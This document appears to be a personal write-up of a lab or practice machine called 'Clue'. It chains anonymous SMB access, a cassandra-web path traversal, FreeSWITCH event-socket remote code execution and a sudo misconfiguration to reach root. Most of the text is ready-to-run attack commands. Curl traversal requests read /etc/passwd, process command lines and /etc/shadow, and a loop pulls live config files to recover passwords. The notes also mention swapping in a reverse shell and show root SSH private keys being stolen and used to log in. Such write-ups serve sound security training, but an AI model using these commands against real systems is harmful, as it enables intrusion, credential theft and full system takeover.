# Clue — Cassandra-web LFI → FreeSWITCH RCE → Root via sudo file-read

**Trigger:** anonymous SMB share holding a service config backup + cassandra-web 0.5.0 (path traversal) on :3000 + FreeSWITCH event socket exposed

**Chain at a glance:** null SMB → mount backup → cassandra-web path traversal (read `/etc/passwd`, `/proc/self/cmdline`) → carve live FreeSWITCH config for the real ESL password → FreeSWITCH RCE foothold → `su cassie` → `sudo cassandra-web` re-run as **root** → root LFI reads `id_rsa` → SSH as root.

---

## Step 1 — Recon

```bash
nmap -sC -sV -p- <IP>
```
→ Notable services:
- **22** — SSH
- **445** — SMB
- **3000** — cassandra-web (Cassandra cluster UI, version 3.11.13 shown in the dashboard)
- **8021** — FreeSWITCH `mod_event_socket` (ESL)

---

## Step 2 — SMB: null session → mount the backup share

```bash
smbclient -L //<IP>/ -N            # -N = no password (null session); list shares
nxc smb <IP> -u '' -p '' --shares  # better: shows READ/WRITE perms per share
```
→ A `backup`-type share is readable anonymously. **Mount it** so native tools (find/grep) work against the whole tree instead of clicking through `smbclient`:

```bash
sudo mount -t cifs //<IP>/<share> /mnt -o guest      
ls -laR /mnt
grep -Ril password /mnt          # hunt creds across the entire backup
```

> The share is a **backup of a service config tree** (FreeSWITCH + Cassandra). Grepping it for `ClueCon` returns only the **default** FreeSWITCH ESL password — the live box has a different one (see Step 6). **Backup config ≠ live config.**

---

## Step 3 — cassandra-web 0.5.0 path traversal (read PoC, do it by hand)

The web UI on :3000 (Execute CQL button errors out — dead end). The version maps to a **directory-traversal** PoC. Don't run the script — lift the primitive: it's just a GET with `../`. Reproduce in Burp (edit the `GET` line to `GET /../../../../etc/passwd`) or curl:

```bash
curl -s --path-as-is "http://<IP>:3000/../../../../etc/passwd"
```
→ `--path-as-is` stops curl collapsing `../` before sending — **required** or the attack never reaches the server.

**Read `/etc/passwd` first** — enumerate real login users (those with `/bin/bash`, not `/usr/sbin/nologin`):
```
cassie:/bin/bash
anthony:/bin/bash
freeswitch:/bin/bash
```
→ drop into `users.txt`.

---

## Step 4 — Steal creds from the running process via `/proc/self/cmdline`

The process serving your request was launched with credentials on its command line — read them straight out:

```bash
curl -s --path-as-is "http://<IP>:3000/../../../../proc/self/cmdline" | tr '\0' ' '
```
→ `/proc/self/cmdline` is null-separated (hence `tr '\0' ' '`). Returns:
```
... -u cassie -p SecondBiteTheApple330
```
→ cassie's Cassandra password. (If `cmdline` is empty, try `/proc/self/environ` for env-var secrets.)

---

## Step 5 — SSH as cassie fails (key-only)

```bash
ssh cassie@<IP>            # Permission denied — password auth disabled (PasswordAuthentication no)
```
→ The password is valid for the web service, **not** for `sshd`. Don't assume one credential works everywhere. Keep moving via the FreeSWITCH path.

---

## Step 6 — Carve the LIVE FreeSWITCH ESL password through the LFI

The FreeSWITCH `mod_event_socket` exploit (exploit-db) needs **target + command + ESL password**. Default is `ClueCon`, but it's been changed here — the backup share only had the default, so pull the **live** config files through the cassandra-web LFI.

```bash
# 1. from the mounted backup, get the candidate config filenames (NOT their contents):
grep -Ril '' /mnt/etc/freeswitch/autoload_configs/ | xargs -n1 basename > tmp

# 2. fetch each LIVE file through the LFI and append into one file:
for i in $(cat tmp); do
  curl -s --path-as-is "http://<IP>:3000/../../../../etc/freeswitch/autoload_configs/$i" >> carve
done

# 3. one grep finds the real password across all of them:
grep -i password carve
```
→ `>>` appends (not `>`, which overwrites each loop). The ESL password lives in `event_socket.conf.xml`. See [[Grep]] and [[Curl]] for the loop breakdown.

---

## Step 7 — FreeSWITCH RCE → foothold

Feed the **real** ESL password into the PoC (target, command, password):

```bash
python3 freeswitch_rce.py <IP> "id" <REAL_ESL_PASSWORD>
# id runs → RCE confirmed
```
→ Swap `id` for a reverse shell to land a foothold (running as the `freeswitch` user).

---

## Step 8 — Lateral to cassie

```bash
su cassie
# password: SecondBiteTheApple330  (from Step 4)
```

---

## Step 9 — Privesc: `sudo cassandra-web` re-run as root

```bash
sudo -l
# (ALL) NOPASSWD: /usr/local/bin/cassandra-web
```
→ cassandra-web **is the same binary with the same path-traversal bug.** Run it as root, bound to a new port:

```bash
sudo /usr/local/bin/cassandra-web -B 0.0.0.0:7777 -u cassie -p SecondBiteTheApple330 &
```
→ Now hit *this* instance's LFI — the process reads files **as root**:

```bash
curl -s --path-as-is "http://127.0.0.1:7777/../../../../etc/shadow"
curl -s --path-as-is "http://127.0.0.1:7777/../../../../home/anthony/.ssh/id_rsa"
curl -s --path-as-is "http://127.0.0.1:7777/../../../../root/.ssh/id_rsa"
```


---

## Step 10 — SSH as root with the recovered key

A recovered private key authenticates as **whoever has the matching public key in their `authorized_keys`** — which may not be the account whose home you found it in. Try it against every user, **including root**:

```bash
chmod 600 found_id_rsa
ssh -o IdentitiesOnly=yes -i found_id_rsa anthony@<IP>   # fails — anthony doesn't trust it
ssh -o IdentitiesOnly=yes -i found_id_rsa root@<IP>      # works — root's authorized_keys trusts it
```
→ Root. See [[SSH]] for the "found key" workflow and the encrypted-key / `ssh2john` check.

---

## Flags

```bash
cat /home/cassie/local.txt    # user flag
cat /root/proof.txt           # root flag
```

---

## Techniques to Remember

- **Mount SMB shares** (`mount -t cifs`) so `find`/`grep` work on the whole tree — far better than `smbclient` for searching. See [[SMB]].
- **Read an exploit for its primitive, reproduce by hand** — traversal was one GET request in Burp/curl with `--path-as-is`. See [[LFI_RFI]].
- **`/proc/self/cmdline` + `/proc/self/environ`** = creds of the running web process via LFI.
- **`grep -Ril` to build a filename list → curl carve loop** to re-pull live files that differ from a backup. See [[Grep]] / [[Curl]].
- **Backup config ≠ live config** — re-fetch the live file when the backup looks default/stale.
- **sudo binary with a file-read bug = root file-read** → `/etc/shadow` + SSH keys. See [[Linux_Priv_Esc]].
- **A found private key belongs to whoever's `authorized_keys` trusts it** — try it against all users incl. root. See [[SSH]].
